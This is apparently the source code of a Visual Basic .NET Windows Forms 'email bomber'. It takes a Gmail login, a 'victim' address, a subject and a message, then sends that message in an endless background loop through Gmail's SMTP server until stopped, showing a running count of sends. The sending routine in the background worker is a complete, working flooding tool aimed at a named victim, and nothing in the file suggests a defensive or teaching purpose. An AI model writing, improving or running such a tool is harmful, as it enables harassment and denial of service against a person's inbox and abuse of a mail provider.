Imports System.Net.Mail
Public Class Form1
    Dim i As Integer
#Region "usless"
    Private Sub Pb1_MouseEnter(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox1.MouseEnter
        PictureBox1.Image = My.Resources.start2
    End Sub

    Private Sub PictureBox1_MouseLeave(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox1.MouseLeave
        PictureBox1.Image = My.Resources.Start1
    End Sub

    Private Sub Pb2_MouseEnter(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox2.MouseEnter
        PictureBox2.Image = My.Resources.Stop2
    End Sub

    Private Sub PictureBox2_MouseLeave(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox2.MouseLeave
        PictureBox2.Image = My.Resources.Stop1
    End Sub

    Private Sub Pb3_MouseEnter(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox3.MouseEnter
        PictureBox3.Image = My.Resources.Exit2
    End Sub

    Private Sub PictureBox3_MouseLeave(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox3.MouseLeave
        PictureBox3.Image = My.Resources.Exit1
    End Sub

    Private Sub PictureBox3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox3.Click
        If Bg1.IsBusy = True Then
            Bg1.CancelAsync()
        End If
        Me.Close()
    End Sub
    Private mPrevPos As New Point
    Private Sub moveme(ByVal sender As System.Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles MyBase.MouseMove
        Dim delta As New Size(e.X - mPrevPos.X, e.Y - mPrevPos.Y)
        If (e.Button = MouseButtons.Left) Then
            Me.Location += delta
            mPrevPos = e.Location - delta
        Else
            mPrevPos = e.Location
        End If
    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        TextBox1.BackColor = Color.Black
        TextBox2.BackColor = Color.Black
        TextBox3.BackColor = Color.Black
        TextBox4.BackColor = Color.Black
        TextBox5.BackColor = Color.Black
        TextBox1.ForeColor = Color.Silver
        TextBox2.ForeColor = Color.Silver
        TextBox3.ForeColor = Color.Silver
        TextBox4.ForeColor = Color.Silver
        TextBox5.ForeColor = Color.Silver
        Label1.Visible = False
        PictureBox9.Visible = False
        PictureBox2.Enabled = False
    End Sub
#End Region
    Private Sub PictureBox1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox1.Click
        Dim rslt As DialogResult
        If TextBox1.Text.Contains("@gmail.com") = False Then
            rslt = MessageBox.Show("From address must contain:" & vbNewLine & " @gmail.com" & vbNewLine & vbNewLine & "Would you like me to add it for you?", "Error", MessageBoxButtons.YesNo, MessageBoxIcon.Error)
            Select Case rslt
                Case Windows.Forms.DialogResult.Yes
                    TextBox1.Text = TextBox1.Text & "@gmail.com"
                    Exit Sub
                Case Windows.Forms.DialogResult.No
                    TextBox1.Text = ""
                    Exit Sub
            End Select
        End If
        If TextBox2.Text.Length <= 7 Then
            MessageBox.Show("Minimum Gmail password length is 8 characters!" & vbNewLine & "Please correct this error!", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Exit Sub
        End If
        If TextBox3.Text.Contains("@") = False Then
            MessageBox.Show("Victims email address is not in the correct form of a valid email address", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Exit Sub
        End If
        If TextBox4.Text = "" Then
            MessageBox.Show("Please enter an email title (Subject)", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Exit Sub
        End If
        If TextBox5.Text = "" Then
            MessageBox.Show("Please enter the email text (Messsage)", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Exit Sub
        End If
        PictureBox1.Enabled = False
        PictureBox2.Enabled = True
        Label1.Visible = True
        PictureBox9.Visible = True
        TextBox1.Enabled = False
        TextBox2.Enabled = False
        TextBox3.Enabled = False
        TextBox4.Enabled = False
        TextBox5.Enabled = False

        Bg1.RunWorkerAsync()
    End Sub

    Private Sub Bg1_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles Bg1.DoWork
        While True
            Try
                Dim MyMailMessage1 As New MailMessage()
                MyMailMessage1.From = New MailAddress(TextBox1.Text)
                MyMailMessage1.To.Add(TextBox3.Text)
                MyMailMessage1.Subject = (TextBox4.Text)
                MyMailMessage1.Body = TextBox5.Text
                MyMailMessage1.Priority = MailPriority.High
                Dim SMTPServer As New SmtpClient("smtp.gmail.com")
                SMTPServer.Port = 587
                SMTPServer.Credentials = New System.Net.NetworkCredential(TextBox1.Text, TextBox2.Text)
                SMTPServer.EnableSsl = True
                If Bg1.CancellationPending Then
                    Exit Sub
                End If
                SMTPServer.Send(MyMailMessage1)
                i += 1
                Bg1.ReportProgress(0)
            Catch ex As Exception
                MessageBox.Show("Can not connect to the Gmail server!", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error)
                Exit Sub
            End Try
End While
    End Sub

    Sub report() Handles Bg1.ProgressChanged
        Label1.Text = i
    End Sub
    Sub done() Handles Bg1.RunWorkerCompleted
        MessageBox.Show("Done", "Done", MessageBoxButtons.OK, MessageBoxIcon.Information)
        PictureBox1.Enabled = True
        PictureBox2.Enabled = False
        TextBox1.Enabled = True
        TextBox2.Enabled = True
        TextBox3.Enabled = True
        TextBox4.Enabled = True
        TextBox5.Enabled = True
        Label1.Visible = False
        PictureBox9.Visible = False
        i = 0
    End Sub

    Private Sub PictureBox2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox2.Click
        Bg1.CancelAsync()
    End Sub
End Class
